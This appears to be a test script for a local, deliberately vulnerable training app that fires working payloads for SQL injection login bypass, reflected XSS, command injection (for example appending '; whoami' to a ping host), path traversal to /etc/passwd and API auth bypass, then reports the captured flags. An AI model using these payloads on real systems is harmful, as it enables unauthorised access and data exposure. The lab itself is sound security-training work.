#!/usr/bin/env python3
"""
Fixed test script for vulnerable_app.py
Tests all 5 challenges and reports flags
"""

import requests
import time
import sqlite3
import sys

BASE_URL = "http://localhost:8080"
TIMEOUT = 5

def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)

def test_sqli():
    """Test SQL Injection in /login"""
    print_section("CHALLENGE 1: SQL INJECTION")
    
    payloads = [
        ("' OR '1'='1' -- ", "password"),
        ("admin'--", "anything"),
        ("' OR '1'='1", "' OR '1'='1"),
        ("admin' /*", "test"),
    ]
    
    results = []
    for username, password in payloads:
        try:
            resp = requests.post(f"{BASE_URL}/login", 
                               data={'username': username, 'password': password},
                               timeout=TIMEOUT, allow_redirects=False)
            
            if 'FLAG{sql_injection_bypass_123}' in resp.text:
                print(f"✅ PAYLOAD WORKS: {username}")
                print(f"   FLAG FOUND: FLAG{{sql_injection_bypass_123}}")
                results.append(True)
            elif 'Welcome' in resp.text or 'successful' in resp.text.lower():
                print(f"✅ LOGIN SUCCESS: {username}")
                if 'FLAG' in resp.text:
                    print(f"   FLAG FOUND: {[line.strip() for line in resp.text.split('<') if 'FLAG' in line]}")
                results.append(True)
            else:
                print(f"❌ FAILED: {username}")
                results.append(False)
        except Exception as e:
            print(f"❌ ERROR: {str(e)}")
            results.append(False)
    
    return sum(results), len(results)

def test_xss():
    """Test XSS in /search"""
    print_section("CHALLENGE 2: CROSS-SITE SCRIPTING (XSS)")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'><script>alert(1)</script>",
    ]
    
    results = []
    for payload in payloads:
        try:
            resp = requests.get(f"{BASE_URL}/search", params={'q': payload}, timeout=TIMEOUT)
            
            if 'FLAG{xss_reflected_456}' in resp.text:
                print(f"✅ PAYLOAD WORKS: {payload[:40]}")
                print(f"   FLAG FOUND: FLAG{{xss_reflected_456}}")
                results.append(True)
            elif payload in resp.text:
                print(f"✅ REFLECTED: {payload[:40]}")
                if 'FLAG' in resp.text:
                    print(f"   FLAG FOUND in response")
                results.append(True)
            else:
                print(f"❌ NOT REFLECTED: {payload[:40]}")
                results.append(False)
        except Exception as e:
            print(f"❌ ERROR: {str(e)}")
            results.append(False)
    
    return sum(results), len(results)

def test_command_injection():
    """Test Command Injection in /ping"""
    print_section("CHALLENGE 3: COMMAND INJECTION")
    
    payloads = [
        ("127.0.0.1; whoami", "semicolon"),
        ("127.0.0.1 | id", "pipe"),
        ("127.0.0.1 && whoami", "and"),
        ("localhost; cat /etc/hostname", "command chain"),
    ]
    
    results = []
    for payload, desc in payloads:
        try:
            resp = requests.post(f"{BASE_URL}/ping", 
                               data={'host': payload},
                               timeout=TIMEOUT)
            
            if 'FLAG{command_injection_789}' in resp.text:
                print(f"✅ {desc.upper()}: {payload}")
                print(f"   FLAG FOUND: FLAG{{command_injection_789}}")
                results.append(True)
            elif any(marker in resp.text for marker in ['uid=', 'gid=', 'root', 'groups=', '/bin']):
                print(f"✅ INJECTION SUCCESS ({desc}): {payload}")
                print(f"   Output contains command result markers")
                results.append(True)
            else:
                print(f"❌ {desc.upper()}: {payload}")
                results.append(False)
        except Exception as e:
            print(f"❌ {desc.upper()} ERROR: {str(e)[:50]}")
            results.append(False)
    
    return sum(results), len(results)

def test_path_traversal():
    """Test Path Traversal in /files"""
    print_section("CHALLENGE 4: PATH TRAVERSAL")
    
    payloads = [
        ("../../../etc/passwd", "traversal with .."),
        ("....//....//etc/hostname", "double slash bypass"),
        ("/etc/hostname", "absolute path"),
        ("files/../../../etc/passwd", "mixed traversal"),
    ]
    
    results = []
    for payload, desc in payloads:
        try:
            resp = requests.get(f"{BASE_URL}/files", params={'file': payload}, timeout=TIMEOUT)
            
            if 'FLAG{path_traversal_234}' in resp.text:
                print(f"✅ {desc.upper()}: {payload}")
                print(f"   FLAG FOUND: FLAG{{path_traversal_234}}")
                results.append(True)
            else:
                print(f"❌ {desc.upper()}: {payload}")
                results.append(False)
        except Exception as e:
            print(f"❌ {desc.upper()} ERROR: {str(e)[:50]}")
            results.append(False)
    
    return sum(results), len(results)

def test_api_auth():
    """Test API Authentication Bypass"""
    print_section("CHALLENGE 5: API AUTHENTICATION BYPASS")
    
    payloads = [
        ({'username': "' OR '1'='1' -- ", 'password': ''}, "SQLi with comment"),
        ({'username': "admin'--", 'password': 'test'}, "admin comment"),
        ({'username': "' OR '1'='1", 'password': "' OR '1'='1"}, "OR on both"),
        ({'username': 'admin', 'password': "' OR '1'='1"}, "admin with password SQLi"),
    ]
    
    results = []
    for payload, desc in payloads:
        try:
            resp = requests.post(f"{BASE_URL}/api/login", 
                               json=payload,
                               timeout=TIMEOUT)
            
            if resp.status_code == 200 and 'success' in resp.text.lower():
                print(f"✅ {desc.upper()}: Success (200)")
                if 'FLAG{auth_bypass_success_789}' in resp.text:
                    print(f"   FLAG FOUND: FLAG{{auth_bypass_success_789}}")
                print(f"   Response: {resp.text[:100]}")
                results.append(True)
            elif 'FLAG' in resp.text:
                print(f"✅ FLAG FOUND: {desc}")
                results.append(True)
            else:
                print(f"❌ {desc.upper()}: Failed (Status {resp.status_code})")
                results.append(False)
        except Exception as e:
            print(f"❌ {desc.upper()} ERROR: {str(e)[:50]}")
            results.append(False)
    
    return sum(results), len(results)

def check_app_running():
    """Check if app is running"""
    try:
        resp = requests.get(f"{BASE_URL}/", timeout=2)
        return resp.status_code == 200
    except:
        return False

if __name__ == '__main__':
    print("\n" + "=" * 70)
    print("  VULNERABLE APP TEST SUITE - FIXED VERSION")
    print("=" * 70)
    
    # Check app
    print("\nChecking if app is running...")
    if not check_app_running():
        print("❌ App is not running on http://localhost:8080")
        print("Start it with: python3 start_vulnerable_app.py")
        sys.exit(1)
    print("✅ App is running!")
    
    # Run tests
    total_passed = 0
    total_tests = 0
    
    p, t = test_sqli()
    total_passed += p
    total_tests += t
    
    p, t = test_xss()
    total_passed += p
    total_tests += t
    
    p, t = test_command_injection()
    total_passed += p
    total_tests += t
    
    p, t = test_path_traversal()
    total_passed += p
    total_tests += t
    
    p, t = test_api_auth()
    total_passed += p
    total_tests += t
    
    # Summary
    print_section("TEST SUMMARY")
    print(f"Total Tests: {total_tests}")
    print(f"Passed: {total_passed}")
    print(f"Failed: {total_tests - total_passed}")
    success_rate = (total_passed / total_tests * 100) if total_tests > 0 else 0
    print(f"Success Rate: {success_rate:.1f}%")
    print("=" * 70)
